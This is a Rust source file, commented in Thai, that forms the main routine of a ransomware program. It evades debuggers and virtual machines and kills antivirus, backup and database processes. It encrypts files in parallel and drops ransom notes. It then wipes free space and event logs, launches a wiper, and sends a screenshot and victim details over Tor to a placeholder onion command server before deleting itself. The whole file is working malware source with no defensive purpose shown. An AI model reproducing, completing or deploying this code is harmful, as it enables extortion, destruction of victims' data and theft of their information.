mod crypto;
mod traversal;
mod ransom_note;
mod persistence;
mod wiper;

use rayon::prelude::*;
use std::process::Command;
use std::thread;
use std::time::Duration;
use chrono::Utc;
use base64::{Engine, engine::general_purpose::STANDARD};

fn kill_annoying_processes() {
    // รายชื่อ processes ที่ชอบกวนการ encrypt (antivirus, backup, database ฯลฯ)
    let processes = vec![
        "msmpeng.exe",      // Windows Defender
        "mcafeeframework", 
        "avastsvc.exe",
        "avgui.exe",
        "sqlservr.exe",     // SQL Server
        "mysqld.exe",       // MySQL
        "backup.exe",
        "veeam.exe",
    ];

    for proc in processes {
        let _ = Command::new("taskkill")
            .args(&["/F", "/IM", proc])
            .output();
    }
}

fn anti_forensic_wipe() {
    #[cfg(windows)]
    {
        // Wipe free space บนทุก drive
        let drives = ["C:", "D:", "E:", "F:"]; // เพิ่ม drive อื่นถ้าต้องการ
        for drive in drives.iter() {
            let _ = Command::new("cipher")
                .args(&["/w:", drive])
                .output();
        }

        // ลบ temp files และ logs
        let _ = Command::new("cmd")
            .args(&["/C", "del /F /Q %TEMP%\\*.* 2>nul"])
            .output();

        let _ = Command::new("cmd")
            .args(&["/C", "wevtutil cl System 2>nul"])
            .output();

        let _ = Command::new("cmd")
            .args(&["/C", "wevtutil cl Security 2>nul"])
            .output();
    }

    #[cfg(not(windows))]
    {
        // สำหรับ Linux: wipe free space ด้วย dd
        let _ = Command::new("sh")
            .arg("-c")
            .arg("dd if=/dev/zero of=/tmp/zero.fill bs=1M count=100 2>/dev/null; rm -f /tmp/zero.fill")
            .output();
    }
}

fn basic_anti_analysis() {
    // เช็ค debugger
    if cfg!(windows) {
        use windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
        unsafe {
            if IsDebuggerPresent().as_bool() {
                std::process::exit(0);
            }
        }
    }

    // เช็ค VM เบื้องต้น
    let vm_indicators = vec!["vmware", "vbox", "qemu", "xen"];
    let sys_info = if let Ok(output) = Command::new("wmic")
        .args(&["computersystem", "get", "manufacturer,model"])
        .output() {
        String::from_utf8_lossy(&output.stdout).to_lowercase()
    } else {
        String::new()
    };
    if vm_indicators.iter().any(|indicator| sys_info.contains(indicator)) {
        // ถ้าเจอ VM ก็แกล้งทำเป็นรันนานๆ แล้วออก
        thread::sleep(Duration::from_secs(60));
        std::process::exit(0);
    }
}

fn main() {
    // 1. Anti-analysis ก่อนเลย
    basic_anti_analysis();

    // 2. Persistence + ลบ recovery
    persistence::add_persistence();
    persistence::disable_recovery();

    // 3. Kill processes ที่อาจขัดขวาง
    kill_annoying_processes();

    // 4. หาไฟล์เป้าหมายทั้งหมด
    let target_files = traversal::get_target_files();

    // 5. Encrypt แบบ parallel สุดแรง (rayon)
    use std::sync::atomic::{AtomicUsize, Ordering};
    let encrypted_count = AtomicUsize::new(0);
    let error_count = AtomicUsize::new(0);

    target_files.par_iter().for_each(|path| {
        // ลอง encrypt ถ้า error ก็ข้ามไป (เช่น file locked)
        match crypto::encrypt_file(path) {
            Ok(_) => { encrypted_count.fetch_add(1, Ordering::Relaxed); },
            Err(e) => {
                error_count.fetch_add(1, Ordering::Relaxed);
                // ใน production ไม่ log แต่สำหรับ debug
                eprintln!("Failed to encrypt {}: {:?}", path.display(), e);
            }
        }
    });

    let total_encrypted = encrypted_count.load(Ordering::Relaxed);
    let total_errors = error_count.load(Ordering::Relaxed);
    // ใน production ไม่ print แต่สำหรับ debug
    println!("Encrypted {} files, {} errors", total_encrypted, total_errors);

    // 6. วาง ransom note ทุกหนแห่ง + เปลี่ยน wallpaper
    ransom_note::drop_ransom_notes();
    #[cfg(windows)]
    ransom_note::change_wallpaper();

    // 6.5 Anti-forensic: wipe free space
    anti_forensic_wipe();

    // 6.6 เริ่ม wiper mode ถ้าไม่จ่าย
    wiper::start_wiper();

    // 7. Exfiltrate ข้อมูลไป C2 ผ่าน Tor
    let encrypted_count = target_files.len();
    let victim_id = uuid::Uuid::new_v4().to_string();

    // จับ screenshot
    let screenshot_path = std::env::temp_dir().join("screenshot.png");
    if cfg!(windows) {
        let _ = Command::new("powershell")
            .args(&[
                "-Command",
                &format!("Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('%{{PRTSC}}'); Start-Sleep -Milliseconds 500; $img = [System.Windows.Forms.Clipboard]::GetImage(); if ($img) {{ $img.Save('{}') }}", screenshot_path.to_str().unwrap().replace("\\", "\\\\"))
            ])
            .output();
    }

    // อ่าน screenshot และ encode base64
    let screenshot_b64 = if screenshot_path.exists() {
        if let Ok(data) = std::fs::read(&screenshot_path) {
            STANDARD.encode(&data)
        } else {
            String::new()
        }
    } else {
        String::new()
    };

    // สร้างรายชื่อไฟล์ที่ encrypt (top 10)
    let file_list: Vec<String> = target_files.iter()
        .take(10)
        .map(|p| p.to_string_lossy().to_string())
        .collect();

    // สร้าง JSON payload
    let payload = serde_json::json!({
        "victim_id": victim_id,
        "encrypted_count": encrypted_count,
        "file_list": file_list,
        "screenshot": screenshot_b64,
        "timestamp": Utc::now().timestamp()
    });

    let exfil_url = "http://your-c2-onion.onion/api/report";

    // สร้าง client กับ Tor proxy
    let proxy = reqwest::Proxy::all("socks5://127.0.0.1:9050").unwrap();
    let client = reqwest::blocking::Client::builder()
        .proxy(proxy)
        .build()
        .unwrap();

    // ส่ง JSON ผ่าน Tor
    let _ = client.post(exfil_url)
        .json(&payload)
        .send();

    // 8. Sleep นิดนึงให้ดู natural แล้วจบ
    thread::sleep(Duration::from_secs(5));

    // 9. Self-delete executable
    let exe_path = std::env::current_exe().unwrap();
    if cfg!(windows) {
        // ใช้ cmd เพื่อลบไฟล์หลัง process จบ
        let _ = Command::new("cmd")
            .args(&["/C", "del", "/F", "/Q", exe_path.to_str().unwrap()])
            .spawn(); // spawn เพื่อไม่ block
    } else {
        // สำหรับ Linux/Mac
        let _ = std::fs::remove_file(exe_path);
    }
}